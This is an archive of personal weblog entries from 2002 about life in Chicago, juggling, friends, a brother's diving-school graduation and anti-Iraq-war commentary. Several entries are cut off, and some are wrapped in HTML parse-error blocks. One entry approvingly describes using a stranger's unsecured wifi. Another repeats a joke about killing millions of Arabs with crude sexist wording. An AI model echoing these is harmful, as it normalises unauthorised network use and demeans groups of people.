                <p>So I have this car and I hate driving it. I never hated it before I moved to chicago. it is just so annoying.. parking and all that crap along with trying to navigate the crazy system that is chicago traffic&#8230; whatever.. and now I have to license, insure and all that crap.. whatever whatever whatever.. heh.<br /><br />one nice thing about driving that you don&#8217;t have as much with the train - is you can stop and get things on the way.. like tonight. I decided that I was going to stay in and try and invite some friends over.. and we could watch some movies or play games.. so I stopped by( on the way) tower records and picked up some dvds.. I got minority report, macross plus, city of lost souls(weird), amadeus(hehe) and three cirque du soliel dvds. I am excited. so.. anyway.. I called some friends.. and hooked up with some kids.. and we all played some games (crononauts and boogle) and generally hung out. it was nice.. I enjoy stuff like that.. hanging out and such..</p>

                <p>I had a good weekend. I hung out all sorts of good friends and heard the downlow on everyones holiday. What a nice thing holidays are. I need another one so I don&#8217;t get so sleepy. ;) On saturday miriam and myself went to a rather humorous play called &#8221;<a href='http://elviswebsite.com/'>cooking with elvis</a>.&#8221; It was quite interesting and had some very funny moments - it was also slightly depressing.. about family dysfunction and the like..</p>
<br />
<p>i am excited for new years however - I really don&#8217;t know what I am going to do.. but I imagine it will be fun. it better be. I hope to get a bunch of sleep tonight so that I can really go out on the 31st. it is strange that it is going to be 2003 in 2 days. weird. <br />x) - sleep now</p>

I am sitting here, back at work, typing this entry in lynx - cuz my windows and primary desktop broke good. ;) I have replaced the hard drive and I am now installing win2k .. whee what fun. I cannot remember when I have had such fun. So .. christmas was entertaining. I enjoyed it. I miss hanging with my parents and stuff already. I really like them. however now I get to see Miriam and hang out with my friends so that is super cool. I do need to finish my christmas cards something fierce&#8230; soon.. soon..</p>

                <p>So last night my brother graduated college. It was probably the most entertaining graduation ceremony I have seen in a long long time. One of the speakers kept swearing and cussing.. hehe. and everyone kept gasping at what he was saying. but he kept it up - it was so funny. I laughed a bunch. Only 20 or so people graduated. so it was a very small group. After the ceremony we went to dinner at this nice sea food resturant. My first friend pam came and sat with us.. I say my first friend - cuz she was one of my first friends I met in chicago.. so it was nice to see her. THe funniest thing she told me was that she went on a couple of dates with C.C. deville. haha.. rule. <br /><br />So then today.. we hung out and played at this weird tourist place. my brother and I played a couple mean games of air hockey and then we went on this boat accross the bay. It was nice. I like the ocean a lot. I would like to eventually live somewhere near the ocean. Oh yea.. last night at dinner I met my brothers friend <a href='http://www.kronusfilms.com'>scott</a> - he is pretty cool ;) <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;It is interesting cuz I miss chicago a little. I miss work a little and I miss my friends a little. Usually I don&apos;t do these things. but work is going well and right now the who &quot;friend&quot; situation is nice. I really miss them.. heh. check the following links out: &lt;a href=&quot;http://seattletimes.nwsource.com/html/localnews/134599925_webmurray20.html&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://www.mirror.co.uk/voiceofthemirror/&quot;&gt;here&lt;/a&gt;</pre></p>

                <p>i find myself in an airport terminal.. using my trusty cell phone as internet access. I was noticing today that I have magically switched my palm pilot for my laptop. weird. I mean the laptop isn&#8217;t much bigger.. but still - I can&#8217;t fit it in my pocket and I can&#8217;t use it to navigate my palm..<br /><br />I am going to LA in an hour to see my brother graduate from <a href='http://www.coo.edu'>commercial diving school</a>. It will be exciting. I brought my clubs.. so I can&#8217;t wait to juggle.. hoepfully the weather is good. I love good weather. however.. I am not really in the mood for good weather (besides juggling :P). it is just that I don&#8217;t really have warm weather clothes.. especially in the dead of winter.. stupid heat.<br /><br />I hope to get a lot of work done.. this break.. I need to plan my newest and greatest project. a little bit of 3gscreensaver for everyone! hehe. <br /><br />i am going to miss hanging out with miriam.. and such.. but I will see her soon.. heh.. <br /><br />i guess I am famous.. <a href='http://www.nata2.info/?path=war'>check it</a>&#8230;</p>

                <p>My computer at work is dieing a slow and painful death. The dell bios diagnostic screen pops up on boot and tells me that my hard drive is going to fail very soon. Ugh.. I am sad. I don&#8217;t want to lose everything. I mean I have it all backed up.. for the most part <b>;)</b> - the thing I am most sad about is my music.. I have ripped so many of my cds so I don&#8217;t have to keep them here.. and now it appears as I will have to re-rip them <b>:(</b>&#8230; so sad.. <br /><br />This weekend was quite nice.. I enjoyed it ;). After stomp.. kinnera got mad cuz I ditched her.. I didn&#8217;t really but she thinks I did.. so I hung out by myself.. all saturday.. played with my surround sound system.. pointed the speakers at the right places.. and replaced the little bad speakers with some larger more full range speakers.. it should sound a bit better.. heh.<br /> After playing surround sound and completely disrupting my house.. I hung out a bit and watched some TV.. Miriam came over and we played a bunch of UNO. how I love UNO. Miriam and I then went to go see common at the HOB. whee. common was quite good. he has such nice eyes&#8230;. heh.. <br />anyway.. after common we went to a very strange party.. which was also fun. a kid there had a duncan yoyo - I haven&#8217;t played with one of those in years and years.. it was fun trying all my yoyo tricks on such a poor yoyo. I was able to pull off quite a few.. surprise.. <br />Then we all went home.. and hung out.. Yesterday - we went to lula and watched crouching tiger hidden dragon.. I haven&#8217;t seen it in awhile.. I love the movie.. and the music is soo good. <br /><br />So.. it was a veyr nice weekend. I have quite enjoyed hanging out with Miriam.. it is refreshing and fun. whee.. <br /><br />Well I think that N. Korea will join Iraq.. heh. whee. is right.. N. Korea == Nuclear Weapons. Iraq == Fun enemy. Both == Violent War. Violent War == Happy Bush. Happy Bush == Happy World. Happy World == <a href='http://nata2.info/pictures/Incoming/gunship_video.mpg'>Heaven</a></p>

                <p>Today I didn&#8217;t goto work. I was sick and didn&#8217;t feel like I could make it through a whole day of work. I haven&#8217;t been eating all that well.. and it was reflected by my bodies giving up and telling me to fuck off .. heh .. yea that is pretty much how it went ;) so I slept until 5:30&#8230; which was weird - cuzi planned on coming in to work after 1:00 - but whatever.. one of the weirder things in my life is having fun and wanting to goto work. cuz - 1.6 years ago when I started I was not as into work as I am now. I really didn&#8217;t like it and it was mostly a pain.. but now I miss a day and am sad.. hehe. whatever. I am a nerd..<br /><br />So.. in other news&#8230; I went on a really nice date on monday night.. and hung out with the girl on tuesday as well. it is really nice.. and I like it a lot..</p>

                <p>Last night we watched the first full length movie on my <a href='http://www.amazon.com/exec/obidos/ASIN/B00006YZ3Z/nata2productions'>new TV</a>. It was nice.. especially with my <a href='http://www.amazon.com/exec/obidos/ASIN/B0000658AY/nata2productions'>new receiver</a>. heh. I really don&#8217;t know what to do about my old receiver.. but whatever - we watched the new <i>Lord of the Rings: Fellowship of the ring</i> with all the extra footage and such. whee.. I like that movie.. I have watched it far too many times.. It was a nice gathering though.. some new friends and some old friends.. I like that the best.. <br /><br />This weekend was filled with juggling.. juggling.. juggling.. so much juggling.. it all started on thursday.. when we juggled for the Crunch Corp. holiday party. It was fun.. but kinda weird.. the problem was the venue.. it is always very hard to juggle in a dark club especially when you don&#8217;t quite know what the people want.. heh.. then on saturday we juggled at the <a href='http://www.movieside.neweyefilms.com/'>Movieside Film Festival</a>.. which was quite entertaining. we juggled there on saturday and sunday. heh. a lot of cool people were invloved and the organizer Rusty Nails was really great. <br /><br />Ugh.. I just remembered that my flights for christmas were on united.. wtf am I doing flying united.. I thought I only flew american.. apparently not.. ugh. I hope this doesn&#8217;t cause problems.. I want to see my bro graduate and I don&#8217;t want to have to pay a billion dollars.. <br /><br /> <a href='http://www.modsquare.com/more.php?id=56_0_8_0_M'>i am famous</a>&#8230; wheee&#8230;</p>

RULE. now it is time to look at some pron. haha. anyway.. I will be back to chitown soon.. I had a really good time in greeley though.. we went to this really silly country western bar that played three songs of country and three songs of pop alternatly. It was so funny. I laughed a lot. We danced and danced. It is nice. I am excited however to have the big city surrounding me. I like cities.</p>

</blockquote> So many choices. I will choose Office job. Thank you.<br /> Apparently <a href='http://www.time.com/time/magazine/article/0,9171,1101021125-390894,00.html'>Gore</a> doesn&#8217;t much like Bush&#8217;s economic strategy. I don&#8217;t much like Bush&#8217;s call for a <a href='http://www.washingtonpost.com/wp-dyn/articles/A61549-2002Nov15.html'>Domestic spy agency</a>. I get scared enough when they start appropriating <a href='http://www.azstarnet.com/border/21115TOMBSTONEBORDER2fmst2fj.html'>private militia</a> for government use, let alone when my tax dollars pay for me to get arrested for haveing a liberal anti-war website - <b>eep</b>.<br /><br /> Anyway, so today I updated my <a href='http://www.harperreed.org/portfolio'>portfolio</a>. It is fun to recap on all the projects I have done. I love writing the little captions. Heh. I am a dork. In other news 3gscreensaver went out and purchased me a nice new TV. Whee. Now the new LOTR 4 dvd set will look tremendous. I am so excited.</p>

<p>Hi,<br /> <br /> I&#8217;m a friend of Harper&#8217;s, and he was telling me about your diving job. We began to wonder a couple of things about diving.<br /> <br /> For instance, if you had to fight a monkey underwater, assuming that the monkey was a well trained diver (he&#8217;s a natural in the water and very athletic), and the monkey was equipped with a knife and the necessary skills to use it, who would win this battle? Also, if you needed a weapon to even the playing field, could you use a really sharp fireman&#8217;s axe?<pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;
&lt;br /&gt;
Also, have you ever been attacked at a depth of 300 feet or more by a polar bear, and if so, what did you do to survive?&lt;br /&gt;
&lt;br /&gt;
Thanks!&lt;br /&gt;
&lt;br /&gt;
Scott&lt;Br&gt;

                <p>Last night I tried to goto bed early. but I was tricked by something. I am not sure what. But something kept me up. I had a lot of weird dreams about moving from my cubicle to a strange undisclosed location and losing my headphones.. or something it was confusing. <br /><br />Last night I emailed myself regarding a weblog post I was supposed to make. here it is:&lt;ul&gt; &lt;li&gt;My <a href='http://www.in5anity.org'>friend jon</a> spent some time on the PCT and also spent some time hanging out with <a href='http://www.sf.indymedia.org/news/2002/10/1534270.php'>these lovely ladies</a>. He is in the last picture in the blue shirt. ;) <li>I added the boobies script ot dopeman. check it out <a href='http://www.dopeman.org/boobies/?text=nata2.org'>here</a>.</li> <li>Apparently the boobies script was made by <a href='http://www.slbs.net'>slbs.net</a> - which is a pretty nice weblog.</li> <li>politically I think that our country <a href='http://www.salon.com/politics/feature/2002/11/07/minnesota/index_np.html'>is</a> broken. I <a href='http://www.pbs.org/now/commentary/moyers15.html'>fear</a> what is about to occur in the "<a href='http://www.suntimes.com/output/news/cst-nws-prof09.html'>free</a>" world. It is sad that the <a href='http://www.washingtonpost.com/wp-dyn/articles/A38472-2002Nov11.html'>war machine</a> is so comprehensive, and is so threatening to the <a href='http://googlism.com/index.htm?ism=freedom&type=1'>freedom</a> we all love so dearly. I get sad. I am not a fan of bush. I don't think anyone is - however wtf is the deal with the GOP winning everything. <a href='http://www.bitchmech.com'>jesus</a>!</li> <li>So last night we saw davidson's movie. It was quite good. It is so refreshing when your friends produce really great things. I enjoy it. I am <a href='http://www.dopeman.org'>blessed</a> with a great number of very talented friends. whee.</li> &lt;/ul&gt; well that is certainly enough.</p>

                <p>My friend <a href='http://www.pen-paper.net/rpgdb.php?op=showcreator&creatorid=2470'>Davidson Cole</a> has made a movie called <b>Design</b>. It is about: <blockquote><small>
Eighteen-year-old Sonya is struggling to save her father from alcoholism after his wife leaves him. Voyeuristic photographer Nicholas is obsessed with women, yet hides behind the prying lens of his camera. Cursed factory worker Seamus and his fiance, Kate, are planning their wedding and coming to grips with the truth about each other--and themselves. The three stories intersect in one evening full of predestined encounters and bizarre circumstances. </small></blockquote> Anyway - it is playing at the art institute this sunday(10th) at 7:30. If you are interested you should arrive at 7:00 and bring $5. It will be really good. Hopefully ;). <a href='http://www.filmthreat.com/Reviews.asp?Id=2624'>here</a> is a good review.

                <p>Apparently a <a href='http://www.azone.org/notabd/'>protest</a> is going down against the <a href='http://www.tabd.org/'>Transatlantic Business Dialogue (TABD)</a>. The TABD offers an effective framework for enhanced cooperation between the transatlantic business community and the governments of the European Union (EU) and United States (US). Or the <a href='http://www.azone.org/notabd/index.php?content=history'>TABD</a> is a coalition of U.S. and European CEOs, that is mandated by and gets unlimited access to the U.S. and European governments. It helps boost transatlantic trade for large corporations by promoting the WTO and knocking down &#8220;barriers to trade&#8221;. According to the TABD barriers to trade can be, labor protections, food safety and health laws, and anything that blocks corporations&#8217; paths to unlimited profit.<br /><br />I am guessing it is the latter. Anyway there is a protest party on thursday(7th of NOvember) against the TABD: <blockquote><small>
<b>wntr81 (9:55:09 AM)</b>: the TABD guys are staying at the Shereton(sp) Hotel<br />
<b>wntr81 (9:59:36 AM)</b>: thursday @ 4:30<br />
<b>wntr81 (9:59:49 AM)</b>: Boeing hq <br />
<b>wntr81 (10:00:02 AM)</b>: canal and washington<br />
<b>wntr81 (10:00:10 AM)</b>: and the hotel I guess<br />
</small>
</blockquote> Hopefully this will be a peaceful protest, however chicago has a great history of peace behind it. Especially the daley&#8217;s. RULE. here are some links to pictures from previous TABD protests:<br /> A <a href='http://www.citybeat.com/tabd/images/new_images/tabd_gun_jb.jpg'>police officer holding a gun</a><br /> <a href='http://www.citybeat.com/tabd/images/new_images/tabd_cop_run_mb.jpg'>Police on the move</a><br /> and the best and scariest picture - <a href='http://www.citybeat.com/tabd/images/new_images/tabd_gunpoint_mb.jpg'>a person at gunpoint</a> <br /><br /> <a href='http://www.azone.org/notabd/images/titanictabd.pdf'>Here</a> is a flyer for the event. This is a really great write up on why <a href='http://www.citybeat.com/tabd/12second.html'>police are violent at protests</a>. Of course, the police won&#8217;t be violent. There is no reason for them to be so. <br /> <blockquote><small><a href='http://www.suntimes.com/output/news/cst-nws-prot05.html'>Police Supt. Terry Hillard stressed Monday that the city welcomes peaceful protesters but will not tolerate thuggery. Officers have been training for months in riot control and flew to Washington to help police control crowds there in September. About 130 officers who are 6 feet 4 inches tall and taller have been selected to arrest violent demonstrators.</a></small></blockquote> <br /><hr /> Well. So here are the oglibitory links to misc. news around the world. Apparently the U.S. government has been engaging in a <a href='http://www.latimes.com/la-op-arkin27oct27001451,0,7355676.story'>Secret war</a> against terrorism. Targeting the &#8220;Axis of Evil.&#8221; This rules. I mean. what better to start a world conflict then secret wars. I love secret wars. Especially when it is fought by Donald Rumsfeld&#8217;s <a href='http://www.themoscowtimes.com/stories/2002/11/01/120.html'>secret police</a>. I trust them to do a good job. In a completely different world, Tom Petty <a href='http://www.rollingstone.com/news/newsarticle.asp?nid=16913&cf=399'>rules</a>, especially concerning the music industry. There is some very interesting news and facts about the <a href='http://www.guerrillanews.com/cgi-bin/wwwthreads/showflat.pl?Cat=&Board=conspiracy&Number=83655&page=0&view=collapsed&sb=5&o=0&part='>sniper</a> Weird.<br /><br /> <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;p&gt;Last night I went and saw Omar Saunders speak of the Roscetti Four. Apparently he was wrongfully convicted as an 18 year old of murdering and raping a yound medical student in chicago. He was convicted along with four other youth. They were found &lt;a href=&quot;http://home.iprimus.com.au/dna_info/dna/JA_DNA_illnews_20011212a.html&quot;&gt;innocent&lt;/a&gt; and a bunch of people will most likely get in trouble for framing them. &lt;p&gt;WHat really frustrates me about this situation is how people when they here about it, or when activists talk about it - they mention how the tax payers are paying for these people to stay in jail and paying for the settlements. well right, but that is our job as tax payers. if we support bad politicians we will be held somewhat accountable for their horrible actions. THe thing that is frustrating for me is that no one is focusing on the fact that the &lt;a href=&quot;http://www.beloitdailynews.com/202/2ill9.htm&quot;&gt;people who commited&lt;/a&gt; would have gotten away with it if it wasn&apos;t for these young men standing strong and figthing a really terrible system.</pre></p>

            <div class="PostContent">
                <p>Community &amp; Digital Rights In the beginning of October I was faced with an interesting situation. I wanted to create a website that allowed for people to upload there own media, but not infringe on copyrights and licenses that I don&#8217;t currently own or are not interested in obtaining.</p>

<p>I tried to find a good way to solve this problem, and I figured a community controlled digital rights management system was good. It allows for ANYONE to up load ANYTHING and the community can remove it or rank it. It is a community-trust moderation system.</p>

<p>Of course it is open to abuse and people can easily lie and not delete copyrighted material. But it allows for the community to actually be honest if they want to. It also allows for no limits as to what is contributed. It could be anything from a self published work to a licensed piece, all being legitimate postings, however if something violates a license or a copyright the community can delete this.</p>

<p>One of the problems with Internet communities is that they tend to be very lazy about maintaining legitimacy in regards to copyrights and licensing agreements so. To counter this apathy, I have instated a few moderators that go through and try and pick out copyrighted or non-licensed material.</p>

<p>Another problem with this system is limiting use of the media object to just this website, phones and other devices that can take advantage of ringtones and screensavers. I have attempted to limit the improper use of the uploaded media so that the owner of the media can be sure it is relatively protected from the outside. Now we all know that a jpg/png file or a midi file are never fully protected, however it is easy to attempt to mask the filenames and make it more difficult for a person to download. I would say that this is an example of .security through obscurity. as it can relate to digital rights management. This is why I have placed the much hated a500hacking tag on all uploaded images. I want to stop people from taking images and using them elsewhere when the person who uploaded and choose the image to be on my site meant it to only be on my site.</p>

<p>Even with this system installed it is tough to get every piece of non-licensed or copyrighted material. If a piece of media is not licensed or violates copyright, please contact me and I will remove it.</p>

<p>I am very interested in hearing what you think of this small social experiment. I do think that community sites can and will work. I also have too much trust in my fellow man. I am very interested in what your take on all of this is; especially if you are from BMI, ASCAP, HFA or any of the large licensing firms. Do communtiy DRM systems work? Of course there will be moments when the system will have a violation or two on it, but what about the whole of the system? Will it crumble or will it prevail?</p>

                <p>I have always thought that a military action in Iraq without the support of the UN could result in igniting a much larger and more violent conflict. The fact that the middle east is a powder keg waiting to explode and the fact that numerous other geopolitical situations are walking a very thin line leads me to conclude now is not the time for an international conflict - especially one where the only support we have is from Great Britian. Seriously.. wtf good is Great Britian, they couldn&#8217;t win a war if it was.. well I really don&#8217;t know. but I know they are dumb. haha.

That was a true loss (versus all those other people who died :P).<br /><br />Here are some links.. <br /> <a href='http://www.cmj.com/articles/display_article.php?id=34754'>A saddlecreek write up</a><br /><a href='http://www.geocities.com/Hollywood/Cinema/3117/sociosmurf2.htm'>Socio-political themes in The Smurfs</a><br /><a href='http://www.emogame.com/'>the Emo Game</a><br /><br />Those are weird eh.<br />Some weird things are going on in our world. <a href='http://www.guardian.co.uk/russia/article/0,2763,820935,00.html'>Russia</a> apparently decided not to wait for the &#8220;terrorists&#8221; to settle things and went ahead and gassed the church where 600 hostages were. The gas apparently killed around 150 of the hostages and has hopitalized 400 more. but fear not, the families of the dead will receive around $6000 for the trouble of losing a loved one. Oh and the U.S. is <a href='http://www.lasvegassun.com/sunbin/stories/bw-wh/2002/oct/28/102802615.html'>not saying a thing</a>.<br />I guess that more <a href='http://www.montserratreporter.org/pics/Hilary%20Clinton%20Senator.jpg'>mainstream politicians</a> are starting to see the <a href='http://www.prnewswire.com/cgi-bin/micro_stories.pl?ACCT=617800&TICK=NEWS&STORY=/www/story/10-27-2002/0001828664&EDATE=Oct+27,+2002'>light</a>&#8230; However are they going to be helpful.. or are they just going to be annoying and use it to their own advantage? <br />Gore Vidal is really mad.

Now that would be insane.<br />here is a joke for yall, however it isn&#8217;t funny: <br /> <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;blockquote&gt;&lt;small&gt;
President Bush and Colin Powell are sitting in a bar. A guy walks in and asks the bartender, &quot;Isn&apos;t that Bush and Powell sitting over there?&quot;&lt;br /&gt;</pre></p>

<p>The barman says, &#8220;Yep, that&#8217;s them.&#8221;<br /> So the guy walks over and says, &#8220;Wow, this is a real honor. What are you guys doing in here?&#8221;<br /></p>

<p>Bush says, &#8220;We&#8217;re planning WW III &#8220;.<br /> And the guy says, &#8220;Really? What&#8217;s going to happen?&#8221;<br /> Bush says, &#8220;Well, we&#8217;re going to kill 140 million Arabs this time and one blonde with big tits.<br /></p>

<p>The guy exclaimed, &#8220;A blonde with big tits? Why kill a blonde with big tits?<br /></p>

<p>Bush turns to Powell, punches Powell on the shoulder, and says, &#8220;See, smart ass?! I told you no one would worry about the 140 million Arabs. &lt;/small&gt;&lt;/blockquote&gt; See.. this is the problem&#8230; <br />i manically misspell weird.</p>

                <p>I was listening to smoe john zorn minding my own business when outta no where Silent Lucidity by Queensryche comes on. this was a song that was played at a friend of mines funeral in high school. He died of alcohol posioning.. in some nieghbors lawn. It was really fuxored up. However, the song was incredible sad and appropriate.. and it spawned a nice conversation with a friend about artists and songs that can spark so much emotion it is often hard to understand.. here is a partial list: The Smiths, portishead, built to spill, Massive Attack, tricky, modestmouse, Cat Power, tori amos, pedro the lion, ani difranco, belle and sebastion, ministry, skinny puppy, new order, cure, david bowie, metallica and I am sure there are many others. It is interesting.. I think a lot of people have this.. well right.. heh..<br /><br />This weekend ended well. I hung out with some cool cats.. and chilled a bunch yesterday. I ended up sleeping a lot which is/was nice. <a href='http://www.dmregister.com/news/stories/c4789004/19520607.html'>here</a> is a nifty link detailing how difficult bush&#8217;s job is. To bad that dolt created the problems he is now facing. stupid isolationist forign policy. whatever.</p>

                <p>So hiromi and I went to dinner at this really great place called irazu. It was nice. I enjoyed it. afterwards we went to a nice coffee shop and got some coffee.. I planned for this -cuz I brought my laptop&#8230; so I could get some work done. I also brought my vision connection kit so I could use my cell phone as a modem and rule!!! however.. I couldn&#8217;t get the bastard to work. So while I was bathing in frustration - I noticed that my wifi tray icon was active. I was like wtf. so I clicked on it.. and what do you know.. the lovely linksys default SSID. wheee.. so I of course connected to it. and low and behold I got a fair connection to some persons broadband. I imagine I will be coming here more often. Rule ;) <br /> <br /> the weird thing.. is that I don&#8217;t believe that I am really on the internet. I had to message all my friends oand such to make sure I wasn&#8217;t imagining free broadband.. hehe. well I am off.. ELECTROCLASH SUCKA</p>

                <p>my brother came over this weekend from LA. It was great. We hung out a bunch and generally chilled out. It was nice to hang out when we are older..</p>
<br />
<p>One of the most interesting things about this weekend was the strange occurance of people asking us which one of us is older. I guess it is because we are now similarly sized and full grown.. or there about. it was interesting. It is now 2 for 3 in favor of dylan. haha. <br /><br /> Anyway.. I am sleepy. I need to goto bed.</p>

                <p>I started out simply enough with the a500hacking.com website, but i soon noticed that the audience for that site had grown, and was hammering my server. I was also getting quite a few donations and noticed that a lot of people seemed interested in giving me more of their hard earned money. So i created this page. It basically allows for anyone to create a &#8220;locker&#8221; to hold all of their personal pictures that they want to be able to put on their phone. It also allows people to upload ringtones and store them. BMI and the like had a small problem with this idea - so i had to remove the public ringtones and put some very stringent ringtone managment policies in effect. After one month the site has remained rather successful and has pretty much ran itself.</p>

                <p>Someday I will make it so I can link back to previous articles. If that day were today.. I would link back to the article from over a year ago about how I love built to spill and I really enjoy them in concert. But since it isn&#8217;t today I won&#8217;t link to that specific article.. instead I will tell you. I really like built to spill and I really enjoy them in concert.. or more appropriatly I really enjoy seeing doug martsch in concert. It was so good. I really enjoy that man. heh. <br /><br /> i got some good links for yall today.. heh. check out the first paragraph of <a href='http://www.washingtonpost.com/wp-dyn/articles/A57618-2002Oct7.html'>this</a> page. hehe. I love how the media is distorting bush now.. heh. what a slide.. although I guess there point about not wanting to make people think that we are going to war is valid.. heh. <a href='http://story.news.yahoo.com/news?tmpl=story2&amp;cid=91&amp;ncid=91&amp;e=8&amp;u=/bpihw/20021008/en_bpihw/bertelsmann_confirms_its_past_connection_to_nazis'>here</a> is a really nice article about how the publishign group bertelsmann helped hitler and the nazis. I think that the company is now acting responsible.. heh. <a href='http://www.dailytelegraph.co.uk/news/main.jhtml?xml=/news/2002/10/08/nuls08.xml&amp;sSheet=/news/2002/10/08/ixnewstop.html'>somehow</a> some bush/blair transcripts were stolen.. hehe. dumbasses.. <br /><br /> it is interesting to see how the U.S. is reacting to post 1 year september eleventh. It seems that people are chilling out. Although last night I was in a cab with a crazy goon who wanted nothing but blow up all those &#8220;arabs.&#8221; wtf. It was frustrating. it was a situation were I could say nothing without getting the cab driver all riled up.. whatever.. I was reading the newest world press review.. and there were some scathing reviews of bush and the US foreign policy.. heh ..</p>

                <p>I wonder how many entires are labeled tonight? a lto. .it is silly. anyway.. onight igot the data cable for my phone. It rules. serious. totally rules. I can get 30k anywhere that sprint is. I am excited.. now I can goto a coffee shop and surf porn all day long.. and only pay 1 million dollars in cell phone charges.. this really won&#8217;t be any different than a normal month I guess.. I really should change my plan. <br /><br />So google debuted its news source. it rules. check it out <a href='http://news.google.com'>here</a>. <br /><br />I also got these nifty little lights to light up my keyboard and laptop in lowlight conditions. they rule. I love LED technology. So bright, so tiny. <br /><br />Tonight after acquiring interesting things.. heh. matiss and I went and juggled at the <a href='http://www.hideoutchicago.com'>hideout</a> for an open mike. It was really fun. It was weird because it is a pretty high profile open mike. So there were(apparently) some guided by voices people, billy corigan and paris from soniadada. Everyone was really great and the sets were amazing. Incredible actually. It was so neat to hang out with really great people who are interested in playing really great music. Not just interested in the fashion of it all.. It is hard to find?. <br /><br />So anyway.. we may have gotten another gig at a show for <a href='http://www.modelpix.com'>stan Malinkowski</a> at some fancy <a href='http://www.twelve12.com'>restaurant</a>. It should be a great experience..</p>

                <p>Tonight I went to see afriends fashion show. It was interesting. Quite something really. the first two collections were good. The models were very professional and the whole presentation was well thought out. The third collection was from the crisiswear, and I have seen it many times before.. it is ok.. not bad. .but not super appealing for me.. however.. my friend rachel was modeling for him so that was nice to see. he most exciting part however was the <a href='http://wildfireentertainment.com'>fire spinners</a>. they were quite professional and very good. Hopefully we will get to work with them. <br /><br />I think I am goign to do the jugglers web site tonight. heh. check it out in the morning <a href='http://www.thejugglers.org'>here</a>.</p>

I didn&#8217;t expect to see anyone at the party I knew.. so it was a pleasent surprise. we just hung out and acted strange.. heh. how weird. ey. The other party was a birthday party for my friend edie. it was fun. everyone was party-in hard. haha. so much dancing. but in the middle of the best song.. ludacris- whats your fantasy - the cd broke.. ugh.. so sad.<br /><br />so.. apparently the women who told the cops that &#8220;those crazy arab guys were terrorists&#8221; might be <a href='http://www.cnn.com/2002/US/09/13/alligator.alley/index.html'>lying..</a>.. weird&#8230; imagine that.</p>

                <p>I have a cynical view on terrorism. I feel that a lot of what we hear and see form the media.. could be government propaganda. I mean it also could be real. you really never know. Today is a good example. Sen. Patrick Leahy is investigating whether <a href='http://story.news.yahoo.com/news?tmpl=story2&amp;cid=519&amp;u=/ap/20020912/ap_on_re_us/leahy_west_nile_1&amp;printer=1'>west nile virus is part of a terrorist plot</a>. This could be a good chance for the government to just be like &#8220;yea it is&#8230; and we need more money.&#8221; Kinda like the padilla thing.. <br /><br />it is also interesting to see the spin that the media puts on things such as <a href='http://sg.search.yahoo.com/search/news_sg_pf?p=ukey%3A5167013'>a common nationalistic response to the threat of strife</a>. According to that report, Iraq is going to teach the US a lesson. Well right what is the Iraq going to say. &#8220;oh yea the US is going to kick our butt and we will just concede.&#8221; whatever.. its dumb. One interesting thing is that Iraq officials have <a href='http://drudgereport.com/flash.htm'>threatened</a> to attack Isreal if Iraq is attacked. This solidifies my feeling that it would be a bad idea to attack Iraq. Because if Isreal is attacked, there is a HUGE chance that Isreal will retaliate.. which may cause a larger scale war than I think anyone wants. This introduces an interesting question&#8230; who wants this war? some are saying that the war will lead to apocalypse.. and some are saying that it will lead to a <a href='http://www.zawya.com/story.cfm?id=255h2625&amp;query=xinhua&amp;searchmethod=Keywords'>"Massive world recession"</a>&#8230;. <br />whatever&#8230; I had a good night last night.. but I am tired.. I use the three period pause too much.</p>

                <p>So one year ago about now I was arriving at work and noticed how everyone was leaving. a friend had woke me up early to tell me about the first plane.. and then the second. it was weird.. I learned about most of this on <a href='http://www.aim.com'>AIM</a>. So I then went to work. Like I said.. all I remember was all the people streaming out of buildings. I came to my office sat there. noticed the news sites were all down.. read slashdot.. was like.. WTF. Then my building was evacuated. I remember getting a call shortly after that from my father. in colorado&#8230; it was reported that chicago was also attacked so my parents thought I may have been in a targeted building.. I then went home and read <a href='http://slashdot.org/article.pl?sid=01/09/11/1547207'>slashdot</a>. After hearing that people had a problem getting to media sites and not finding any media myself.. I started wgeting all of the media I could find. which is how I got <a href='http://nata2.info/?path=pictures%2Fmisc%2F09-11-2001'>this</a> archive of media. It was a weird day altogether. I took a nap.. then I helped a friend jump her car. and then I got sad. because I thought we were going to goto war. I was so scared about war. I still am. but I assumed that bush would really screw things up. His staff seemed so incompetent. good thing I wasn&#8217;t right. HA. <br /><br />Anyway. I think it is a good time to awknoledge those who gave their lives trying to help and save others. good job. you will be missed. <br /><br />Look <a href='http://slashdot.org/article.pl?sid=02/09/09/1318236&amp;mode=nested&amp;tid=103&amp;threshold=3'>here</a> for commentary from slashdot. More to come later perhaps..</p>

                <p>So this weekend was the weekend of roomate house warming parties. It was fun. On friday I went and saw my friends band.. winnie. heh.. which is both the band and my friends name. They played with some other friends of mine.. Tallulah. heh. what a surprise. but anyway. so then after that I went to a friends house warming party. what a night. a bunch of people got naked and ran around.. mostly danced.. but whatever.. such a party. hehe. <br /><br />Then on saturday.. I basically just hung around and lazed.. heh. it was great. utill around 8.. at which time we had a party - a sorta house warming party for our new roomate and a real house warming party for our neighbor. it was great to have a combined party. although I forgot to invite a bunch of people :( alas.. it was still fun. I saw a bunch of friends. and I feel it was a success. <br />then today.. a friend of mine had a BBQ at his house. it was a lot of fun. I really hope that we are able to juggle for some of these kids. it would be really great. oh. I almost forgot.. check <a href='http://www.enterprisemission.com/physics.html'>this</a> out&#8230;. &#8230; &#8230;</p>

I think it is funny, because Bush and his supporters are now trying to show how Saddam is stockpiling weapons and preparing for war and such. well right. the U.S. has been saying for the last 3 months that we are going to invade.i would be stockpiling weapons and preparing for war if the U.S. was going to attack me too.. oh wait. I am stockpiling weapons and preparing for war.. umm right.. yea..

                <p>This weekend I worked. I ended a 14 day streak of working 8 hours or more a day. it was rough. but I finally had a one day vacation. suxor. my projet goes live tomarrow. I am gettign sick. I need caffiene. I need to learn how to spell. I got a new <a href='http://www.samsungusa.com/cgi-bin/nabc/prod/hhcommerce/telecommunications/sph_a500_features.jsp'>phone</a>.. 3G.. in da house. it is cool. color and all.

I hope they have the sense enough to distance themselve from this war monger. <br /><br />i hope we don&#8217;t start a nuclear war. then I woudl lose my recently acquired 3G phone service.. without ever seeing the potential that is there .. haha</p>

